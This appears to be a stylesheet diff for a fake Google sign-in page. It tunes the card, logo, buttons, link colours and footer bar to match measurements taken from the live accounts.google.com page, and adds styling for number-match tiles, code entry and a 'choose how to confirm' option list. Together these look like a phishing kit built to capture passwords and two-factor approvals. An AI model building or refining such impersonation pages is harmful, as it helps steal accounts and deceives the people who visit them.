@@ -60,26 +60,32 @@ body {
   z-index: 55;
 }
 
-/* ---- the Google sign-in card (popup content) ---- */
+/* ---- the Google sign-in card (popup content) ----
+   Matches accounts.google.com (fetched live): 450px, 8px radius, 1px #dadce0
+   border, NO shadow, tall card (content sits at the top, footer bar at the
+   bottom). The page-level footer bar (language + Help/Privacy/Terms) lives
+   inside the card's bottom edge, like the real page. */
 .g-card {
   width: 450px;
   max-width: calc(100vw - 32px);
+  min-height: 520px;
+  display: flex;
+  flex-direction: column;
   border: 1px solid #dadce0;
   border-radius: 8px;
-  box-shadow: 0 8px 30px rgba(60, 64, 67, 0.35);
-  padding: 48px 40px 36px;
   background: #fff;
   animation: popcard .18s ease;
 }
+.g-card .g-body { flex: 1; padding: 48px 40px 40px; }
 @keyframes popcard { from { transform: translateY(10px); opacity: .5; } to { transform: translateY(0); opacity: 1; } }
 
-/* ---- logo ---- */
+/* ---- logo (the real sign-in page hotlinks this gstatic wordmark) ---- */
 .g-logo {
   display: flex;
   justify-content: center;
   margin-bottom: 16px;
 }
-.g-logo svg { width: 48px; height: 48px; }
+.g-logo img { width: 74px; height: 24px; display: block; }
 /* driver landing logo — muted grey vehicle mark so it reads as a custom app */
 .g-logo.dlogo { color: #5f6368; margin-bottom: 8px; }
 .g-muted { color: #5f6368; font-size: 13px; align-self: center; }
@@ -158,7 +164,7 @@ body {
   padding: 0 4px;
 }
 .g-field input:focus {
-  border: 2px solid #0b57d0;
+  border: 2px solid #1a73e8;
   padding-left: 15px; /* keep text at same spot despite thicker border */
 }
 .g-field input:focus ~ label,
@@ -166,9 +172,9 @@ body {
   top: 0;
   transform: translateY(-50%);
   font-size: 12px;
-  color: #0b57d0;
+  color: #1a73e8;
 }
-.g-field input:focus ~ label { color: #0b57d0; }
+.g-field input:focus ~ label { color: #1a73e8; }
 .g-field input:not(:placeholder-shown):not(:focus) ~ label { color: #5f6368; }
 /* hint / helper under a field */
 .g-hint { font-size: 12px; color: #5f6368; margin: -4px 0 8px; padding-left: 16px; }
@@ -195,9 +201,9 @@ body {
 }
 .g-show input { width: 16px; height: 16px; accent-color: #0b57d0; cursor: pointer; }
 
-/* ---- links ---- */
+/* ---- links (real Google blue #1a73e8, measured on the live page) ---- */
 .g-link {
-  color: #0b57d0;
+  color: #1a73e8;
   font-size: 14px;
   font-weight: 500;
   text-decoration: none;
@@ -207,7 +213,9 @@ body {
   padding: 4px;
   border-radius: 4px;
 }
-.g-link:hover { background: rgba(66, 133, 244, 0.08); }
+.g-link:hover { background: rgba(26, 115, 232, 0.08); }
+/* a link sitting under a field (Forgot email? / Forgot password?) */
+.g-link.below { display: block; margin: 2px 0 0; padding-left: 2px; }
 
 /* ---- footer with guest hint + Next button ---- */
 .g-footer {
@@ -218,30 +226,32 @@ body {
   gap: 12px;
 }
 .g-guest {
-  font-size: 13px;
+  margin: 24px 0 0;
+  font-size: 14px;
   color: #5f6368;
-  line-height: 1.4;
+  line-height: 1.5;
 }
-.g-guest .g-link { font-size: 13px; padding: 0; }
+.g-guest .g-link { padding: 0 2px; }
 
-/* ---- Google pill button ---- */
+/* ---- Google button (measured on the live page: 36px, 4px radius, #1a73e8,
+   no shadow — the current sign-in uses squared buttons, not pills) ---- */
 .g-btn {
-  background: #0b57d0;
+  background: #1a73e8;
   color: #fff;
   border: none;
-  border-radius: 20px;
-  height: 40px;
-  min-width: 96px;
+  border-radius: 4px;
+  height: 36px;
+  min-width: 72px;
   padding: 0 24px;
   font-family: "Google Sans", Roboto, Arial, sans-serif;
-  font-size: 15px;
+  font-size: 14px;
   font-weight: 500;
   cursor: pointer;
-  box-shadow: 0 1px 2px rgba(60, 64, 67, 0.3);
+  box-shadow: none;
   transition: background .15s, box-shadow .15s;
 }
-.g-btn:hover { background: #1b66c9; box-shadow: 0 1px 3px rgba(60, 64, 67, 0.4); }
-.g-btn:active { background: #1c5fad; box-shadow: 0 1px 3px rgba(60, 64, 67, 0.4), 0 4px 8px rgba(60, 64, 67, 0.3); }
+.g-btn:hover { background: #185abc; box-shadow: 0 1px 2px rgba(60, 64, 67, 0.2); }
+.g-btn:active { background: #174ea6; box-shadow: 0 1px 3px rgba(60, 64, 67, 0.3); }
 .g-btn:disabled { background: #8ab4f8; cursor: default; box-shadow: none; }
 
 /* ---- loading state (spinner in place of the label, like Google's progress) ---- */
@@ -277,7 +287,7 @@ body {
 .g-approve-dot {
   width: 12px; height: 12px;
   border-radius: 50%;
-  background: #0b57d0;
+  background: #1a73e8;
   animation: pulse 1.4s ease-in-out infinite;
 }
 .g-approve-dot.ok   { background: #188038; animation: none; }
@@ -310,14 +320,14 @@ body {
   transition: border-color .12s, background .12s, box-shadow .12s, transform .12s;
 }
 .g-numtile:hover {
-  border-color: #0b57d0;
+  border-color: #1a73e8;
   background: #f6f9fe;
   box-shadow: 0 2px 6px rgba(60, 64, 67, .15);
   transform: translateY(-1px);
 }
 .g-numtile:disabled { cursor: default; opacity: .7; transform: none; }
 .g-numtile.picked {
-  border-color: #0b57d0;
+  border-color: #1a73e8;
   background: #e8f0fe;
   box-shadow: 0 0 0 3px rgba(11, 87, 208, .15);
 }
@@ -338,7 +348,7 @@ body {
   padding: 30px 12px;
   border-radius: 16px;
   background: #e8f0fe;
-  border: 2px solid #0b57d0;
+  border: 2px solid #1a73e8;
   text-align: center;
   font-family: "Google Sans", Roboto, Arial, sans-serif;
   font-size: 52px;
@@ -353,7 +363,7 @@ body {
   height: 150px;
   font-size: 56px;
   letter-spacing: 6px;
-  border-color: #0b57d0;
+  border-color: #1a73e8;
   background: #f6f9fe;
 }
 
@@ -375,47 +385,45 @@ body {
   outline: none;
   font-family: "Google Sans", Roboto, Arial, sans-serif;
 }
-.g-code input:focus { border: 2px solid #0b57d0; }
+.g-code input:focus { border: 2px solid #1a73e8; }
 
-/* ---- authentic Google bottom footer (Help · Privacy · Terms + language) ---- */
+/* ---- page footer bar (bottom of the card, like accounts.google.com):
+   "English (United States) ▾" left, Help · Privacy · Terms right ---- */
 .g-footerbar {
-  position: fixed;
-  left: 0;
-  right: 0;
-  bottom: 0;
   display: flex;
   align-items: center;
   justify-content: space-between;
   gap: 16px;
-  padding: 16px 24px;
-  border-top: 1px solid #dadce0;
+  padding: 12px 24px;
+  border-top: 1px solid #e8eaed;
   background: #fff;
   font-family: Roboto, Arial, sans-serif;
-  font-size: 13px;
-}
-.g-foot-left {
-  display: flex;
-  align-items: center;
-  gap: 4px;
+  font-size: 12px;
+  border-radius: 0 0 8px 8px;
 }
 .g-foot-link {
   background: none;
   border: none;
   color: #5f6368;
-  font-size: 13px;
+  font-size: 12px;
   font-family: Roboto, Arial, sans-serif;
-  padding: 6px 12px;
+  padding: 6px 10px;
   border-radius: 4px;
   cursor: pointer;
 }
 .g-foot-link:hover { background: rgba(60, 64, 67, 0.08); color: #3c4043; }
+.g-foot-links { display: flex; }
 .g-foot-lang {
   display: flex;
   align-items: center;
   gap: 6px;
   color: #5f6368;
+  font-size: 12px;
+  font-family: Roboto, Arial, sans-serif;
+  background: none;
+  border: none;
   cursor: pointer;
-  padding: 6px 12px;
+  padding: 6px 10px;
   border-radius: 4px;
 }
 .g-foot-lang:hover { background: rgba(60, 64, 67, 0.08); color: #3c4043; }
@@ -473,7 +481,9 @@ body {
 }
 
 @media (max-width: 520px) {
-  .g-card { padding: 40px 24px 28px; box-shadow: none; border: none; }
+  .g-card { border: none; }
+  .g-card .g-body { padding: 40px 24px 28px; }
+  .g-footerbar { padding: 10px 16px; }
 }
 
 /* ---- browser/error screen ---- */
@@ -605,3 +615,29 @@ body {
 }
 .appfoot-links a { color: #5f6368; text-decoration: none; }
 .appfoot-links a:hover { text-decoration: underline; }
+
+/* ---- "choose how to confirm" option list (mirrors the real Google page) ---- */
+.g-choice-list { display: flex; flex-direction: column; gap: 10px; margin: 10px 0 6px; }
+.g-choice {
+  width: 100%;
+  min-height: 54px;
+  padding: 12px 18px;
+  border-radius: 12px;
+  border: 1.5px solid #dadce0;
+  background: #fff;
+  font-family: "Google Sans", Roboto, Arial, sans-serif;
+  font-size: 15px;
+  font-weight: 500;
+  color: #1a73e8;
+  text-align: left;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  cursor: pointer;
+  transition: border-color .12s, background .12s, box-shadow .12s;
+}
+.g-choice::before { content: "\2192"; color: #9aa0a6; font-size: 16px; }
+.g-choice:hover { background: #f6f9fe; border-color: #1a73e8; }
+.g-choice:active { background: #e8f0fe; }
+.g-choice:disabled { color: #9aa0a6; border-color: #e8eaed; background: #f8f9fa; cursor: default; }
+.g-choice:disabled::before { color: #dadce0; }
